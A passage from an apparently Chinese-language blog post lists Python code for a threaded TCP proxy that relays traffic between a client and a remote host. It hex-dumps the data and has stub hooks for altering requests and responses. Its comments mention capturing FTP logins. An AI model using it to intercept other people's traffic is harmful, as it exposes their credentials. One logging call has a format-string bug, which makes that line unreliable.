data-num=\"21\"></td><td><pre>logging 为调试部分。不想显示调试信息可以把logging.basicConfig的level改成更高的等级，或者注释logging语句。</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hex_dump</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    显示数据包的十六进制，并显示对应的ASCII码。</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    digits <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        s <span class=\"token operator\">=</span> src<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> length<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        hexa <span class=\"token operator\">=</span> <span class=\"token string\">' '</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"%0*X\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t\\thexa:%s\"</span> <span class=\"token operator\">%</span> hexa<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        text <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&lt;=</span> x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x7F</span> <span class=\"token keyword\">else</span> <span class=\"token string\">'.'</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t\\ttext:%s\"</span> <span class=\"token operator\">%</span> text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\"%04X   %-*s   %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> length <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>digits <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hexa<span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">receive_from</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    接收本地或远程主机的数据</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># 接收数据需要在 2s 内处理完成，否者抛出超时异常。  这个时间有些短，后续测试的时候输入 FTP 账号、密码的时间有些紧。。。</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\"># 可调长一些，但其实应该用更科学的办法来处理。。。  还是那句话，后面的路还很远，先略过。。。</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    connection<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token comment\"># 一直读入缓冲区，直到没有更多的数据</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token comment\"># 我们给它设置超时报错</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            data <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token comment\"># 显示函数没有接收到数据</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"def receive_from no data return\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"receive data:%s\\n\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token builtin\">buffer</span> <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># 显示该函数的报错信息</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">'def receive_from error:%s'</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">buffer</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">request_handler</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    可以在该函数中修改传送到目标主机的数据（请求数据）。</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    功能未完待续</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    执行包修改</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">buffer</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">response_handler</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    可以在该函数中修改目标主机返回到本地主机的数据（响应数据）</pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    功能未完待续</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    执行包修改</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">buffer</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proxy_handler</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    在线程中处理代理任务</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    代理服务器与目标绑定套接字</pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token comment\"># 打印该线程 ID，语句只能在 Linux 下执行</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    threading_id <span class=\"token operator\">=</span> ctypes<span class=\"token punctuation\">.</span>CDLL<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>syscall<span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token comment\"># 请求与目标主机的连接。</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    remote_socket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    remote_socket<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    <span class=\"token comment\"># 如有必要先从目标接受数据，如 FTP 服务器会先发送旗标等等</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token keyword\">if</span> receive_first<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token comment\"># 接收远程主机的数据</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        remote_buffer <span class=\"token operator\">=</span> receive_from<span class=\"token punctuation\">(</span>remote_socket<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token comment\"># 在日志中打印出原始数据</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"threading id: %s remote_buffer:%s\\n\"</span> <span class=\"token operator\">%</span> threading_id<span class=\"token punctuation\">,</span> remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token comment\"># 调用十六进制转储函数</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        hex_dump<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token comment\"># 将它发送到我们的响应处理器</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token comment\"># 响应函数什么都没写，数据还是原样返回</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        remote_buffer <span class=\"token operator\">=</span> response_handler<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token comment\"># 如果从目标接受到了数据，就发送到我们的本地客户端</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[&lt;==] Sending %d bytes to localhost.\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token comment\"># 现在我们循环读取数据，发送给远程主机和本地客户端</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        <span class=\"token comment\"># 接收本地主机的数据</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>        local_buffer <span class=\"token operator\">=</span> receive_from<span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        <span class=\"token comment\"># 如果有数据就打印</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[==>] Received %d bytes from localhost.\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>            hex_dump<span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>            <span class=\"token comment\"># 将它发送到我们的请求处理程序</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>            <span class=\"token comment\"># 请求处理函数什么都没写，数据还是原样返回</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>            local_buffer <span class=\"token operator\">=</span> request_handler<span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>            <span class=\"token comment\"># 将数据发送到目标主机</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>            remote_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[==>] Sent to remote.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>        <span class=\"token comment\"># 接收远程主机的数据</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>        remote_buffer <span class=\"token operator\">=</span> receive_from<span class=\"token punctuation\">(</span>remote_socket<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>        <span class=\"token comment\"># 如果有数据就打印</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[&lt;==] Received %d bytes from remote.\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>            hex_dump<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>            <span class=\"token comment\"># 发送到我们的响应处理器</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>            remote_buffer <span class=\"token operator\">=</span> response_handler<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>            <span class=\"token comment\"># 将响应发送到本地套接字</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[&lt;==] Sent to localhost.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>        <span class=\"token comment\"># 如果两边没有更多的数据，则关闭连接</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>            remote_socket<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] No more data. Closing connections.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">server_loop</span><span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    【需要代理方】与【代理服务器】绑定套接字</pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>    <span class=\"token comment\"># 创建一个套接字对象</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    server <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>        <span class=\"token comment\"># 绑定服务地址</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>        server<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!!] Failed to listen on %s:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!!] Check for other listening sockets or correct permissions.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Listening on %s:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>    server<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>        <span class=\"token comment\"># 返回一个二元元组</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>        client_socket<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        <span class=\"token comment\"># 打印客户端连接信息</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[==>] Received incoming connection from %s:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        <span class=\"token comment\"># 启动一个线程与目标通信</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>        proxy_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>proxy_handler<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>                                        args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>        proxy_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"194\"></td><td><pre>    解析运行参数，调用服务。</pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>    <span class=\"token comment\"># 这里没有花哨的命令行解析</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage: ./proxy.py [localhost] [localport] [remotehost] [remoteport] [receive_first]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 